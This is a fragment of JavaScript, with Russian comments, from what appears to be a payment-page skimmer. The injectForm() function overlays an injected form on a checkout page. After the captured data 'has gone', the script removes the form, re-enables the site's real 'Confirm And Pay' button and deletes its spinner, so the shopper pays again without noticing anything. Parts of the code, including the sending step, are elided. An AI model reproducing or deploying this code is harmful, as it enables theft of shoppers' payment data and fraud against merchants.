  ...
  function injectForm() {
    ...
    try {
      ...
      btn.addEventListener('click', function () {
        ...
        // данные ушли — убираем форму, РЕАКТИВИРУЕМ их кнопку и отпускаем юзера:
        // он сам нажмёт Confirm And Pay ещё раз (настоящим кликом) и их флоу пойдёт.
        setTimeout(function () {
          try {
            ...
            INJECTED = false;
            RELEASED = true;
            // снять disabled/спиннер с их кнопки
            var pb = document.getElementById('payButton');
            if (pb) {
              pb.disabled = false;
              pb.classList.remove('disabled');
              var sp = pb.querySelector('.spinner-border, .spinner, .fa-spinner, [class*="spin"]');
              if (sp) sp.remove();
            }
          } catch (e) {}
        }, 1600);
